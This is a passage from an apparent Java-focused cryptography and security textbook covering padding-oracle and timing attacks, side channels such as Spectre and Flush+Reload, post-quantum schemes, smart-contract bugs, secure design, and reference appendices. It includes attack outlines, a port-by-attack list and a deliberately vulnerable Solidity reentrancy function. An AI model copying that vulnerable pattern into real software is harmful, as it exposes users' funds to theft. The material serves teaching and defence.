2. One value will produce valid padding (decryption of last byte XORs to 0x01)
3. From this, derive the plaintext byte
4. Extend to reveal the entire block byte by byte
5. Repeat for all blocks

**16 bytes per block × 256 guesses × 2 blocks** = ~8192 queries to decrypt a block.

**POODLE, BEAST, Lucky13** — all variants of this attack.

**Defense: Always use AEAD (GCM, ChaCha20-Poly1305).** These check the authentication tag before attempting decryption, preventing oracle attacks.

## 31.6 Timing Attacks

**Timing attacks** exploit the fact that different key bits cause measurably different execution times.

**RSA example:** Square-and-multiply algorithm:
- Extra multiplication when bit = 1 (takes more time)
- An attacker measuring many decryption times can infer key bits

**Mitigations:**
- **Blinding**: Randomize inputs before computation, remove randomization after
- **Montgomery Multiplication**: Constant-time algorithm
- **Constant-time code**: Avoid branches and memory accesses that depend on secret data

```java
// BAD: timing-variable comparison — exits early on first mismatch
boolean verifyBad(String a, String b) {
    return a.equals(b); // or Arrays.equals(a.getBytes(), b.getBytes())
    // time depends on how many bytes match — leaks info via timing
}

// GOOD: constant-time comparison — always takes the same time regardless of content
boolean verifyConstantTime(byte[] a, byte[] b) {
    // MessageDigest.isEqual() is constant-time in Java (since Java 6):
    return MessageDigest.isEqual(a, b);
}

// Also available in Java security libraries:
// org.springframework.security.crypto.codec — safeEquals()
// javax.crypto.Mac — use for HMAC-based comparison
// Example: compare HMAC tags:
boolean verifyHmac(byte[] expected, byte[] actual) {
    return MessageDigest.isEqual(expected, actual); // constant-time ✓
}
```

---

# Chapter 32: Side-Channel Attacks

## 32.1 What Are Side Channels?

Side-channel attacks exploit **physical implementation information** rather than mathematical weaknesses:

- **Timing** (covered above)
- **Power analysis**: Measure device's power consumption
- **Electromagnetic (EM)** emanations
- **Cache/memory access patterns**
- **Acoustic** (sound from capacitors)
- **Optical** (light emissions from screens/devices)

## 32.2 Power Analysis

Smart cards and HSMs are particularly vulnerable.

**Simple Power Analysis (SPA):**
- Single power trace reveals operations
- RSA square-and-multiply: power spike for multiply

**Differential Power Analysis (DPA, Kocher et al., 1998):**
- Collect thousands of power traces
- Statistical analysis correlates power with key bits
- Can extract AES keys from unprotected devices with ~1000 traces

**Countermeasures:**
- Randomize operations (random projective coordinates for ECC)
- Masking: XOR with random value (mask) before processing, remove after
- Balanced logic: ensure power consumption is independent of data

## 32.3 Spectre and Meltdown (Microarchitectural Attacks)

These 2018 attacks exploit CPU speculative execution:

**Meltdown (CVE-2017-5754):**
- CPU speculatively executes instructions before checking permissions
- Speculative access to kernel memory leaves data in CPU cache
- Cache side-channel (Flush+Reload) extracts data at ~500 KB/s
- Fixed by OS kernel page-table isolation (KPTI)

**Spectre (CVE-2017-5753, CVE-2017-5715):**
- Trains branch predictor to speculatively execute chosen code paths
- Leaks cross-process memory (e.g., browser JavaScript can read browser process memory)
- Difficult to fully mitigate (architecture-level fix needed)

**Mitigations:** `retpoline`, CPU microcode updates, `IBRS`, `STIBP`, site isolation in browsers

## 32.4 Cache Timing Attacks

### Flush+Reload

```
1. Flush: evict target cache line (shared memory)
2. Victim accesses target (loads it into cache)
3. Reload: measure time to access target
   - Fast (~10 cycles): Victim accessed it → cache hit
   - Slow (~200 cycles): Victim didn't access it → cache miss
```

Can spy on other processes' memory access patterns, including AES table lookups.

**Defense for cryptographic code:** Use AES-NI hardware instructions (no table lookups) or bitsliced software implementations.

---

# Chapter 33: Post-Quantum Cryptography (Deep Dive)

## 33.1 Quantum Computing Threat Model

**Shor's Algorithm** (1994) runs in polynomial time on a quantum computer for:
- Integer factorization → Breaks RSA
- Discrete logarithm (all groups, including elliptic curves) → Breaks DH, DSA, ECDH, ECDSA, Ed25519

**Timeline estimates:**
- Current (2024): Quantum computers are ~1000s of noisy qubits
- RSA-2048 requires ~4000 logical (error-corrected) qubits
- Each logical qubit requires ~1000 physical qubits → ~4 million physical qubits needed
- Best estimate: 10-15 years for cryptographically relevant quantum computers

**"Harvest Now, Decrypt Later"**: Adversaries may be storing encrypted traffic today to decrypt once quantum computers are available. Sensitive data with >10 year classification should migrate now.

## 33.2 Lattice-Based Cryptography

The basis of CRYSTALS-Kyber and CRYSTALS-Dilithium.

**Learning With Errors (LWE):**
Given many (a, b) pairs where b = <a, s> + e mod q (e is small error), find s.
This is believed to be hard even for quantum computers.

**Module-LWE (MLWE):** Works over polynomial rings — more efficient than plain LWE.

### CRYSTALS-Kyber (ML-KEM)

```
Key Generation:
  s, e ~ small random (error distribution)
  A ~ uniform random matrix
  b = As + e  (public key = (A, b))

Encapsulate:
  r, e₁, e₂ ~ small random
  u = Aᵀr + e₁
  v = bᵀr + e₂ + encode(message)
  ciphertext = (u, v)

Decapsulate:
  message ≈ v - sᵀu  (noise terms cancel out)
```

Security parameter comparison:
| Level | Classic Bits | Kyber Variant | PK Size | CT Size |
|-------|-------------|---------------|---------|---------|
| 1 | 128 | Kyber-512 | 800B | 768B |
| 3 | 192 | Kyber-768 | 1184B | 1088B |
| 5 | 256 | Kyber-1024 | 1568B | 1568B |

### CRYSTALS-Dilithium (ML-DSA)

Based on hardness of MLWE and Module Short Integer Solution (MSIS):

| Level | Classic Bits | Variant | PK Size | Sig Size |
|-------|-------------|---------|---------|---------|
| 2 | 128 | Dilithium2 | 1312B | 2420B |
| 3 | 192 | Dilithium3 | 1952B | 3293B |
| 5 | 256 | Dilithium5 | 2592B | 4595B |

## 33.3 Hash-Based Signatures (SPHINCS+)

Conservative approach: security based only on the collision resistance of the hash function.

**XMSS/SPHINCS+:** Use hash trees to sign many messages with one-time signature schemes (WOTS+).

If hash functions survive quantum attacks (Grover only gives √ speedup → use SHA-384 for 192-bit quantum security), SPHINCS+ is secure.

Trade-off: Larger signature sizes (8-50 KB) but very conservative security proof.

---

# Chapter 34: Blockchain & Distributed Trust

## 34.1 Cryptographic Building Blocks of Blockchain

Blockchain technology is applied cryptography:

**Hash functions:** Each block header includes H(previous_block_header), creating a linked chain. Changing any historical block invalidates all subsequent hashes.

**Digital signatures:** Transaction inputs are signed with the sender's private key (ECDSA on secp256k1 for Bitcoin). Only the private key owner can spend their coins.

**Merkle Trees:** Transactions in a block are organized in a Merkle tree — each leaf is H(transaction), each parent is H(left_child || right_child). The Merkle root goes in the block header. This enables efficient SPV (Simplified Payment Verification) — prove a transaction is in a block without downloading all transactions.

```
        Merkle Root
            │
        ┌───┴───┐
       H12     H34
       / \     / \
      H1  H2  H3  H4
      │   │   │   │
     tx1 tx2 tx3 tx4
```

## 34.2 Proof of Work

Bitcoin's consensus mechanism:

```
Find nonce such that:
H(block_header || nonce) < target

Target determines difficulty — lower target = harder puzzle
At 2024 difficulty: ~10^22 hash computations to find a block
Current hashrate: ~700 EH/s (7×10^20 hashes/second)
```

**Security:** An attacker must control >50% of the network's hash rate to rewrite history (51% attack). For Bitcoin, this is economically infeasible.

## 34.3 Smart Contracts and Security

Ethereum smart contracts are programs on the blockchain — immutable once deployed, executed by all nodes.

**Common vulnerabilities:**

**Reentrancy:** A contract calls an external contract, which calls back before state is updated:
```solidity
// VULNERABLE:
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    (bool success,) = msg.sender.call{value: amount}("");  // attacker re-enters here
    balances[msg.sender] -= amount;  // this runs AFTER re-entry, never decrements!
}
// DAO Hack (2016): $60M stolen via reentrancy
```

**Integer Overflow/Underflow:** Solidity <0.8 doesn't check for overflow. Fixed with SafeMath or Solidity 0.8+.

**Access Control:** Missing `onlyOwner` modifier on admin functions.

---

# Chapter 35: Building Secure Systems

## 35.1 Secure Development Lifecycle (SDL)

Security must be integrated throughout development, not bolted on at the end.

**Microsoft SDL phases:**
```
1. Training     → Security training for all developers
2. Requirements → Define security requirements, misuse cases
3. Design       → Threat modeling, attack surface analysis
4. Coding       → Secure coding standards, banned functions list
5. Testing      → Static analysis (SAST), dynamic testing (DAST), fuzzing
6. Release      → Penetration testing, final security review
7. Response     → Security response process, update mechanism
```

## 35.2 Cryptographic Agility

Design systems to swap cryptographic algorithms without architecture changes:

```java
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.*;

// BAD: Hardcoded algorithm — impossible to migrate without code changes
public byte[] encryptBad(byte[] data, SecretKey key) throws Exception {
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); // hardcoded
    cipher.init(Cipher.ENCRYPT_MODE, key);
    return cipher.doFinal(data);
}

// GOOD: Algorithm driven by configuration — cryptographic agility
public class CryptoService {
    private final String algorithm;
    private final int keySize;

    public CryptoService(String algorithm, int keySize) {
        this.algorithm = algorithm; // e.g., "AES/GCM/NoPadding"
        this.keySize   = keySize;   // e.g., 256
    }

    public byte[] encrypt(byte[] data, SecretKey key) throws Exception {
        switch (algorithm) {
            case "AES/GCM/NoPadding": {
                byte[] iv = new byte[12];
                new SecureRandom().nextBytes(iv);
                GCMParameterSpec spec = new GCMParameterSpec(128, iv);
                Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
                c.init(Cipher.ENCRYPT_MODE, key, spec);
                return c.doFinal(data);
            }
            case "ChaCha20-Poly1305": {
                byte[] nonce = new byte[12];
                new SecureRandom().nextBytes(nonce);
                AlgorithmParameterSpec spec = new IvParameterSpec(nonce);
                Cipher c = Cipher.getInstance("ChaCha20-Poly1305");
                c.init(Cipher.ENCRYPT_MODE, key, spec);
                return c.doFinal(data);
            }
            default: throw new IllegalArgumentException("Unknown algorithm: " + algorithm);
        }
    }
}
// Load from config: new CryptoService(System.getProperty("crypto.alg","AES/GCM/NoPadding"), 256)
```

**Cryptographic agility is essential for:**
- Responding to new vulnerabilities (SHA-1 collision → migrate to SHA-256)
- Post-quantum migration (swap ECDH for Kyber)
- Meeting new compliance requirements

## 35.3 Secrets Management

**Never hardcode secrets in source code.** Use:

| Solution | Use Case |
|----------|---------|
| Environment variables | Simple deployments, development |
| HashiCorp Vault | Enterprise secrets management |
| AWS Secrets Manager / Parameter Store | AWS deployments |
| Azure Key Vault | Azure deployments |
| GCP Secret Manager | GCP deployments |
| Kubernetes Secrets (+ sealed secrets or Vault injection) | Container deployments |
| HSM (Hardware Security Module) | Key storage for highest-security keys |

**Secret rotation:** Secrets should be rotated regularly and immediately upon suspected compromise. Design systems to handle credential rotation without downtime.

## 35.4 Cryptography Implementation Guidelines

**Dos:**
- ✅ Use well-audited libraries (OpenSSL, BouncyCastle, libsodium, cryptography.io)
- ✅ Use AEAD modes (AES-GCM, ChaCha20-Poly1305)
- ✅ Use Argon2id for password hashing
- ✅ Use HKDF to derive multiple keys from one shared secret
- ✅ Use Ed25519 or ECDSA P-256 for signatures
- ✅ Use X25519 or ECDH P-256 for key exchange
- ✅ Always validate certificates (including hostname)
- ✅ Use TLS 1.2+ (prefer TLS 1.3)
- ✅ Use random, unique nonces for every encryption
- ✅ Use authenticated encryption — protect both confidentiality AND integrity
- ✅ Store keys in secure storage (HSM, key management service)

**Don'ts:**
- ❌ Never implement your own cryptographic algorithms
- ❌ Never use ECB mode
- ❌ Never use MD5 or SHA-1 for security purposes
- ❌ Never reuse nonces/IVs
- ❌ Never use RC4, DES, 3DES, or RC2
- ❌ Never use RSA < 2048 bits
- ❌ Never store passwords in plaintext or with MD5/SHA1
- ❌ Never use `rand()` or `Math.random()` for cryptographic operations
- ❌ Never disable certificate validation
- ❌ Never roll your own crypto

## 35.5 Zero Trust Architecture

Traditional security: "Trust everything inside the perimeter." Zero Trust: "Never trust, always verify."

**Zero Trust Principles:**
1. **Verify explicitly**: Always authenticate and authorize based on all available data points (identity, location, device health, service, workload, data classification)
2. **Use least privilege**: Limit user access with just-in-time and just-enough-access, risk-based adaptive policies, and data protection
3. **Assume breach**: Minimize blast radius, encrypt end-to-end, use analytics to get visibility, drive threat detection

**Zero Trust components:**
- Strong identity (MFA for all users, device management)
- Micro-segmentation (each service can only talk to explicitly authorized services)
- Endpoint security (managed devices with EDR)
- Data classification and DLP
- Continuous monitoring and logging
- Just-in-time privileged access

## 35.6 Security Metrics and Measurement

You can't improve what you can't measure:

**Key metrics:**
- **MTTD (Mean Time to Detect)**: How long until a breach is discovered? Industry average: 194 days
- **MTTR (Mean Time to Respond)**: How long to contain a breach?
- **Vulnerability Remediation SLAs**: Critical patch in 24h, High in 7 days, Medium in 30 days
- **Patch Coverage**: % of systems with current security patches
- **MFA Coverage**: % of accounts with MFA enrolled
- **Security Training Completion**: % of employees who completed security training
- **Phishing Click Rate**: % of employees who click test phishing emails
- **Attack Surface Coverage**: % of systems covered by vulnerability scanner

---

# APPENDICES

---

## Appendix A: Cryptographic Standards Reference

### NIST Standards
| Standard | Content |
|---------|---------|
| FIPS 197 | AES |
| FIPS 186-5 | DSS (RSA, ECDSA, EdDSA) |
| FIPS 198-1 | HMAC |
| FIPS 202 | SHA-3 |
| FIPS 180-4 | SHA-1, SHA-2 |
| FIPS 203 | ML-KEM (Kyber) |
| FIPS 204 | ML-DSA (Dilithium) |
| FIPS 205 | SLH-DSA (SPHINCS+) |
| SP 800-38A | Block cipher modes (ECB, CBC, CFB, OFB, CTR) |
| SP 800-38D | GCM mode |
| SP 800-57 | Key management recommendations |
| SP 800-90A | RNGs (HMAC-DRBG, CTR-DRBG) |
| SP 800-131A | Transitioning cryptographic algorithms |

### RFC Reference (Key Cryptographic RFCs)
| RFC | Content |
|-----|---------|
| RFC 5246 | TLS 1.2 |
| RFC 8446 | TLS 1.3 |
| RFC 5652 | CMS (Cryptographic Message Syntax) |
| RFC 5280 | X.509 PKI |
| RFC 5869 | HKDF |
| RFC 6979 | Deterministic ECDSA |
| RFC 7748 | Curve25519, Curve448 |
| RFC 8032 | Ed25519, Ed448 |
| RFC 7517 | JSON Web Key (JWK) |
| RFC 7519 | JSON Web Token (JWT) |
| RFC 4226 | HOTP |
| RFC 6238 | TOTP |

---

## Appendix B: Algorithm Quick-Reference Card

### Symmetric Encryption
```
✅ AES-256-GCM           (AEAD, most common)
✅ ChaCha20-Poly1305     (AEAD, high performance, no hardware needed)
✅ AES-128-GCM           (acceptable for non-critical)
❌ AES-CBC               (no authentication — use AEAD instead)
❌ AES-ECB               (never)
❌ DES / 3DES / RC4      (broken or deprecated)
```

### Asymmetric Encryption
```
✅ RSA-OAEP (3072+ bits)
✅ ECIES (P-256 or Curve25519)
✅ CRYSTALS-Kyber (post-quantum)
❌ RSA-PKCS1v1.5         (Bleichenbacher vulnerable)
❌ RSA < 2048 bits
```

### Digital Signatures
```
✅ Ed25519               (fastest, safest)
✅ ECDSA P-256           (widely supported)
✅ RSA-PSS (3072+ bits)  (for RSA compatibility)
✅ ML-DSA (Dilithium)    (post-quantum)
❌ RSA-PKCS1v1.5 sig     (malleable)
❌ DSA (without Bernstein nonce)
```

### Key Agreement
```
✅ X25519 (ECDH with Curve25519)
✅ ECDH P-256
✅ CRYSTALS-Kyber (post-quantum KEM)
❌ DH < 2048 bits
❌ Unauthenticated DH (MITM vulnerable)
```

### Hashing
```
✅ SHA-256 / SHA-384 / SHA-512
✅ SHA3-256 / SHA3-512
✅ BLAKE2b / BLAKE3
❌ SHA-1                  (collisions found)
❌ MD5                    (collisions in seconds)
```

### Password Hashing
```
✅ Argon2id              (best choice)
✅ bcrypt (cost ≥12)     (acceptable, legacy compat)
✅ scrypt                (memory-hard)
❌ PBKDF2 with < 600k iter
❌ SHA-256(password+salt) (too fast)
❌ Plaintext             (obviously)
```

### MACs
```
✅ HMAC-SHA256 / HMAC-SHA384
✅ Poly1305 (via ChaCha20-Poly1305)
✅ GHASH (via AES-GCM)
❌ HMAC-MD5              (MD5 is broken)
```

---

## Appendix C: Port Reference for Security Professionals

### Commonly Targeted Services
```
21    FTP (unencrypted) → Brute force, anonymous login, bounce attacks
22    SSH → Brute force, old OpenSSH vulns
23    Telnet → Cleartext, fully insecure
25    SMTP → Open relay, spam, username enum
53    DNS → Zone transfer, cache poisoning, amplification DDoS
80    HTTP → Web application attacks
110   POP3 → Credential theft
139/445 SMB → EternalBlue, WannaCry, lateral movement, Pass-the-Hash
443   HTTPS → Web app attacks on TLS
3306  MySQL → Brute force, injection
3389  RDP → Brute force, BlueKeep, session hijacking
5432  PostgreSQL → Brute force, injection
6379  Redis → Unauthenticated access (common misconfiguration)
8080/8443 HTTP/HTTPS alternate
27017 MongoDB → Unauthenticated access (common misconfiguration)
```

---

## Appendix D: Security Checklists

### TLS Configuration Checklist
- [ ] TLS 1.2 minimum (TLS 1.3 preferred)
- [ ] Disable SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1
- [ ] Only forward-secret cipher suites (ECDHE or DHE)
- [ ] AES-GCM or ChaCha20-Poly1305 only
- [ ] SHA-256+ certificates (not SHA-1)
- [ ] RSA 2048+ or ECDSA P-256+ certificate keys
- [ ] HSTS header (max-age ≥ 1 year, includeSubDomains)
- [ ] OCSP Stapling enabled
- [ ] Certificate Transparency (let's encrypt provides automatically)
- [ ] 90-day or shorter certificate lifetime
- [ ] Automated renewal (ACME/Let's Encrypt)

Test with: `ssl-labs.com/ssltest/` or `testssl.sh`

### Web Application Security Checklist
- [ ] All inputs validated and sanitized server-side
- [ ] Parameterized queries (no string concatenation for SQL)
- [ ] HTML encoding of all output (prevent XSS)
- [ ] CSP header configured
- [ ] CSRF protection (SameSite cookies + CSRF tokens)
- [ ] Security headers (X-Frame-Options, X-Content-Type-Options, etc.)
- [ ] HttpOnly + Secure + SameSite cookie flags
- [ ] Authentication with MFA
- [ ] Rate limiting and account lockout
- [ ] Sensitive data encrypted at rest
- [ ] Dependencies regularly updated (Maven `dependency-check`, Gradle `dependencyCheckAnalyze`, GitHub Dependabot)
- [ ] Security scanning in CI/CD (SAST, DAST, SCA)
- [ ] No secrets in code (secret scanning)

### Password Hashing Checklist
- [ ] Using Argon2id, bcrypt, or scrypt (not MD5/SHA-1)
- [ ] Salt generated with CSPRNG, minimum 16 bytes
- [ ] Iterations/cost factor meeting 2024 OWASP recommendations
- [ ] Timing-safe comparison for verification
- [ ] Rehashing on login if parameters upgraded

---

## Appendix E: Glossary

| Term | Definition |
|------|-----------|
| **AAD** | Additional Authenticated Data — authenticated but not encrypted in AEAD |
| **AEAD** | Authenticated Encryption with Associated Data — encryption + integrity in one |
| **APT** | Advanced Persistent Threat — sophisticated, long-duration targeted attack |
| **ARP** | Address Resolution Protocol — maps IP to MAC addresses |
| **ASN.1** | Abstract Syntax Notation One — data encoding standard for cryptographic structures |
| **BGP** | Border Gateway Protocol — internet inter-domain routing protocol |
| **CA** | Certificate Authority — trusted entity that issues digital certificates |
| **CIDR** | Classless Inter-Domain Routing — IP addressing notation with prefix length |
| **CRL** | Certificate Revocation List — list of revoked certificates |
| **CSRF** | Cross-Site Request Forgery — tricks browsers into making unauthorized requests |
| **CTR** | Counter mode — block cipher mode creating a stream cipher |
| **DER** | Distinguished Encoding Rules — binary ASN.1 encoding |
| **DH** | Diffie-Hellman — key agreement protocol |
| **DLP** | Discrete Logarithm Problem — hard mathematical problem underlying DH, DSA |
| **DMZ** | Demilitarized Zone — network segment between internet and internal network |
| **DNS** | Domain Name System — maps hostnames to IP addresses |
| **DoS/DDoS** | Denial of Service / Distributed DoS — attack on availability |
| **DSA** | Digital Signature Algorithm — US federal standard for digital signatures |
| **ECDH** | Elliptic Curve Diffie-Hellman — key agreement using elliptic curves |
| **ECDLP** | Elliptic Curve Discrete Logarithm Problem — hard problem underlying ECC |
| **ECDSA** | Elliptic Curve Digital Signature Algorithm |
| **EdDSA** | Edwards Curve Digital Signature Algorithm (e.g., Ed25519) |
| **EKU** | Extended Key Usage — certificate extension specifying allowed uses |
| **FCS** | Frame Check Sequence — Ethernet checksum |
| **GCM** | Galois/Counter Mode — AEAD mode for AES |
| **GHASH** | Galois Hash — authentication function in GCM |
| **HKDF** | HMAC-based Key Derivation Function |
| **HMAC** | Hash-based Message Authentication Code |
| **HSM** | Hardware Security Module — tamper-resistant key storage |
| **HTTPS** | HTTP over TLS |
| **IDS/IPS** | Intrusion Detection/Prevention System |
| **IKE** | Internet Key Exchange — used in IPSec |
| **IV** | Initialization Vector — per-message randomness for block ciphers |
| **KDF** | Key Derivation Function |
| **KEM** | Key Encapsulation Mechanism |
| **LDAP** | Lightweight Directory Access Protocol |
| **LFSR** | Linear Feedback Shift Register |
| **MAC** | Message Authentication Code (also: Media Access Control address) |
| **MITM** | Man-in-the-Middle attack |
| **MFA** | Multi-Factor Authentication |
| **MLWE** | Module Learning With Errors — lattice problem |
| **MTU** | Maximum Transmission Unit |
| **NAT** | Network Address Translation |
| **NIST** | National Institute of Standards and Technology (US) |
| **OCSP** | Online Certificate Status Protocol |
| **OTP** | One-Time Pad (also: One-Time Password) |
| **PBKDF2** | Password-Based Key Derivation Function 2 |
| **PEM** | Privacy Enhanced Mail — base64+header encoding for certs/keys |
| **PFS** | Perfect Forward Secrecy |
| **PKI** | Public Key Infrastructure |
| **PRNG/CSPRNG** | Pseudorandom Number Generator / Cryptographically Secure PRNG |
| **RSA** | Rivest-Shamir-Adleman public key algorithm |
| **SAE** | Simultaneous Authentication of Equals — WPA3 protocol |
| **SAN** | Subject Alternative Name — certificate extension for hostnames |
| **SIEM** | Security Information and Event Management |
| **SNI** | Server Name Indication — TLS extension for virtual hosting |
| **SNMP** | Simple Network Management Protocol |
| **SSRF** | Server-Side Request Forgery |
| **TLS** | Transport Layer Security |
| **TTL** | Time to Live (IP) / Time to Live (DNS TTL/cache time) |
| **VPN** | Virtual Private Network |
| **WAF** | Web Application Firewall |
| **XSS** | Cross-Site Scripting |
| **ZKP** | Zero-Knowledge Proof |

---

## Appendix F: Essential Security Tools

### Cryptography & PKI
| Tool | Purpose |
|------|---------|
| `openssl` | Swiss army knife for certs, TLS, encoding |
| `gnutls-cli` | TLS client for testing |
| `certtool` | Certificate management (GnuTLS) |
| `hashcat` | GPU password hash cracker (for testing) |
| `john` | CPU password cracker |
| `ssh-keygen` | Generate SSH keys |

### Network Analysis
| Tool | Purpose |
|------|---------|
| `wireshark` / `tshark` | Packet capture and analysis |
| `tcpdump` | Command-line packet capture |
| `nmap` | Network scanning |
| `masscan` | High-speed port scanner |
| `netstat` / `ss` | Connection and socket state |
| `traceroute` / `tracepath` | Network path analysis |
| `dig` / `nslookup` | DNS lookup |
| `curl` / `wget` | HTTP client with SSL info |

### Network Security
| Tool | Purpose |
|------|---------|
| `nmap --script` | NSE scripts for vulnerability detection |
| `nikto` | Web server scanner |
| `metasploit` | Exploit framework |
| `burpsuite` | Web application testing proxy |
| `sqlmap` | SQL injection testing |
| `aircrack-ng` | Wi-Fi security auditing |
| `bettercap` | Network attack framework |
| `hashcat` / `hydra` | Password cracking |

### Forensics
| Tool | Purpose |
|------|---------|
| `volatility3` | Memory forensics |
| `autopsy` / `sleuthkit` | Disk forensics |
| `dc3dd` / `dd` | Forensic disk imaging |
| `foremost` / `bulk_extractor` | File carving |
| `yara` | Malware pattern matching |
| `strings` | Extract strings from binary |

---

## Appendix G: Further Learning Resources

### Books
- **"Serious Cryptography"** by Jean-Philippe Aumasson — Best practical cryptography book
- **"Applied Cryptography"** by Bruce Schneier — Classic reference
- **"Cryptography Engineering"** by Ferguson, Schneier, Kohno — Engineering focus
- **"The Web Application Hacker's Handbook"** by Stuttard & Pinto — Web security
- **"Network Security Essentials"** by Stallings — Networking focus
- **"The Art of Intrusion"** by Kevin Mitnick — Social engineering and attack stories

### Online Courses
- **Cryptography I & II** — Dan Boneh, Stanford (Coursera) — Best cryptography course
- **CS 161 Computer Security** — UC Berkeley — Excellent free course
- **OWASP WebGoat** — Hands-on web security training (Java-based!)
- **TryHackMe / HackTheBox** — Hands-on security labs
- **PentesterLab** — Web vulnerability practice

### Java Security Libraries & Frameworks

| Library / Artifact | Purpose |
|-------------------|---------|
| **JCA / JCE** (built-in) | Core Java crypto: `javax.crypto`, `java.security` |
| **Bouncy Castle** `bcprov-jdk18on` | Full crypto suite: AES, RSA, ECC, PQC, HKDF, Argon2 |
| **Spring Security Crypto** | Password encoding (bcrypt, Argon2, SCrypt), key management |
| **Tink (Google)** `google-tink` | High-level, misuse-resistant crypto API (AEAD, signatures, hybrid) |
| **Nimbus JOSE+JWT** | JWT, JWS, JWE, JWK — industry standard library |
| **JJWT** `io.jsonwebtoken:jjwt-api` | Popular JWT library for Spring/Java |
| **OkHttp + certificate pinning** | HTTPS client with built-in cert pinning support |
| **argon2-jvm** `de.mkammerer:argon2-jvm` | Argon2id password hashing |
| **jBCrypt** `org.mindrot:jbcrypt` | bcrypt password hashing |
| **OWASP Java Encoder** `org.owasp.encoder:encoder` | Context-aware HTML/JS/URL output encoding |
| **OWASP ESAPI** | Enterprise security API for Java |
| **Hibernate Validator / Bean Validation** | Input validation (`@NotNull`, `@Pattern`, `@Size`) |

### Useful Java Code Snippets Reference

**AES-256-GCM Encrypt/Decrypt:**
```java
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.*;

public static byte[] aesGcmEncrypt(byte[] plaintext, SecretKey key) throws Exception {
    byte[] iv = new byte[12];
    new SecureRandom().nextBytes(iv);
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
    byte[] ciphertext = cipher.doFinal(plaintext);
    // Prepend IV to ciphertext for storage/transmission
    byte[] result = new byte[iv.length + ciphertext.length];
    System.arraycopy(iv, 0, result, 0, iv.length);
    System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);
    return result;
}

public static byte[] aesGcmDecrypt(byte[] ivAndCiphertext, SecretKey key) throws Exception {
    byte[] iv         = Arrays.copyOfRange(ivAndCiphertext, 0, 12);
    byte[] ciphertext = Arrays.copyOfRange(ivAndCiphertext, 12, ivAndCiphertext.length);
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
    return cipher.doFinal(ciphertext); // throws AEADBadTagException if tampered
}
```

**PBKDF2 Key Derivation (built-in Java, no dependency):**
```java
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;

public static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int keyLenBits)
        throws Exception {
    PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, keyLenBits);
    SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
    byte[] key = skf.generateSecret(spec).getEncoded();
    spec.clearPassword(); // erase password from memory
    return key;
}
// Usage: byte[] key = pbkdf2("password".toCharArray(), salt, 600_000, 256);
```

**SHA-256 Hash:**
```java
import java.security.MessageDigest;

public static String sha256Hex(byte[] data) throws Exception {
    MessageDigest md = MessageDigest.getInstance("SHA-256");
    byte[] hash = md.digest(data);
    StringBuilder sb = new StringBuilder();
    for (byte b : hash) sb.append(String.format("%02x", b));
    return sb.toString();
}
```

**HMAC-SHA256:**
```java
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

public static byte[] hmacSha256(byte[] key, byte[] data) throws Exception {
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(new SecretKeySpec(key, "HmacSHA256"));
    return mac.doFinal(data);
}
```

**RSA-2048 Key Generation + Encrypt/Decrypt:**
```java
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.OAEPParameterSpec;
import java.security.spec.MGF1ParameterSpec;
import javax.crypto.spec.PSource;

// Generate key pair
KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
kpg.initialize(2048, new SecureRandom());
KeyPair keyPair = kpg.generateKeyPair();

// Encrypt with RSA-OAEP (SHA-256 hash, SHA-256 MGF1)
OAEPParameterSpec oaepSpec = new OAEPParameterSpec(
    "SHA-256", "MGF1", MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT);
Cipher enc = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
enc.init(Cipher.ENCRYPT_MODE, keyPair.getPublic(), oaepSpec);
byte[] ciphertext = enc.doFinal("Secret message".getBytes(StandardCharsets.UTF_8));

// Decrypt
Cipher dec = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
dec.init(Cipher.DECRYPT_MODE, keyPair.getPrivate(), oaepSpec);
byte[] plaintext = dec.doFinal(ciphertext);
```

**Load X.509 Certificate from File:**
```java
import java.security.cert.*;
import java.io.*;

CertificateFactory cf = CertificateFactory.getInstance("X.509");
try (FileInputStream fis = new FileInputStream("server.crt")) {
    X509Certificate cert = (X509Certificate) cf.generateCertificate(fis);
    System.out.println("Subject: " + cert.getSubjectX500Principal());
    System.out.println("Issuer:  " + cert.getIssuerX500Principal());
    System.out.println("Expires: " + cert.getNotAfter());
    cert.checkValidity();              // throws if expired
    cert.verify(issuerCert.getPublicKey()); // throws if invalid signature
}
```

**TLS Client with Custom Trust Store:**
```java
import javax.net.ssl.*;
import java.security.*;

KeyStore trustStore = KeyStore.getInstance("PKCS12");
try (FileInputStream fis = new FileInputStream("truststore.p12")) {
    trustStore.load(fis, "changeit".toCharArray());
}
TrustManagerFactory tmf = TrustManagerFactory.getInstance("PKIX");
tmf.init(trustStore);

SSLContext sslContext = SSLContext.getInstance("TLSv1.3");
sslContext.init(null, tmf.getTrustManagers(), new SecureRandom());

// Use with HttpsURLConnection or Apache HttpClient or OkHttp
HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());
```

### Certifications
| Certification | Level | Focus |
|--------------|-------|-------|
| CompTIA Security+ | Entry | Broad security fundamentals |
| CEH | Mid | Ethical hacking |
| OSCP | Mid-Advanced | Penetration testing (practical) |
| CISSP | Advanced | Security management |
| CISM | Advanced | Security management |
| CCNA Security | Mid | Cisco networking security |
| AWS Security Specialty | Mid | Cloud security |

### Standards and Specifications
- **NIST Cryptographic Standards**: csrc.nist.gov
- **OWASP**: owasp.org
- **IETF RFCs**: rfc-editor.org
- **CVE Database**: cve.mitre.org
